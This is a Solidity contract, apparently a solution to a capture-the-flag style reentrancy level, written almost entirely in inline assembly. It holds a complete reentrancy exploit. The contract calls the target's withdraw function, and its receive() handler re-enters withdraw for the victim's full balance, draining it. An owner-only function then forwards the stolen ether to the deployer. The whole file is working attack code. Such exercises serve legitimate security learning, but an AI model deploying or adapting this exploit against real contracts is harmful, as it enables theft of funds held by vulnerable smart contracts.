// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

interface Reentrance {
    function withdraw(uint _amount) external;
}

contract ReentrancyExploit {
    address payable owner;

    constructor() {
        // owner = payable(msg.sender);
        assembly {
            sstore(0, caller())
        }
    }

    function exploit(address reentrance, uint256 amount) public {
        // Reentrance(reentrance).withdraw(amount);
        assembly {
            mstore(0, "withdraw(uint256)")
            mstore(0, keccak256(0, 17))
            mstore(4, amount)
            let success := call(gas(), reentrance, 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }

    receive() external payable {
        // if (msg.sender.balance > 0) {
        //     Reentrance(msg.sender).withdraw(msg.sender.balance);
        // }
        assembly {
            if gt(balance(caller()), 0) {
                mstore(0, "withdraw(uint256)")
                mstore(0, keccak256(0, 17))
                mstore(4, balance(caller()))
                let success := call(gas(), caller(), 0, 0, 0x24, 0, 0)
                if iszero(success) {
                    revert(0, 0)
                }
            }
        }
    }

    function withdraw() public {
        // require(msg.sender == owner, "not owner");
        // (bool success, ) = msg.sender.call{ value: address(this).balance }("");
        // require(success);

        assembly {
            let msgSender := caller()

            // just for fun, let's revert with a string this time
            if iszero(eq(msgSender, sload(owner.slot))) {
                let ptr := mload(0x40)

                mstore(ptr, "Error(string)")
                mstore(ptr, keccak256(ptr, 13))

                mstore(add(ptr, 4), 0x20)
                mstore(add(add(ptr, 4), 0x20), 9)
                mstore(add(add(ptr, 4), 0x40), "not owner")
                revert(ptr, 0x64)
            }

            let success := call(gas(), msgSender, selfbalance(), 0, 0, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }
}
